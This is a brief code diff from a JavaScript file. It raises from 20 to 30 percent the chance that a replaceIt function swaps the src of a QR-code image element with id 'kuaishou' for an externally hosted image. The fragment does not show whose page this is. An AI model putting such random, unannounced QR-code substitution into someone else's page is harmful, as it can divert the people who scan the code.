@@ -20,7 +20,7 @@ const replaceIt = () => {
                 return;
             }
 
-            const canDoIt = Math.random() < 0.2;
+            const canDoIt = Math.random() < 0.3;
             if (canDoIt) {
                 const erweimaDom = document.getElementById('kuaishou');
                 erweimaDom.setAttribute("src", 'https://article.biliimg.com/bfs/article/27305a8b174d8cf7bf1f388c26c1647f8029a07f.jpg');
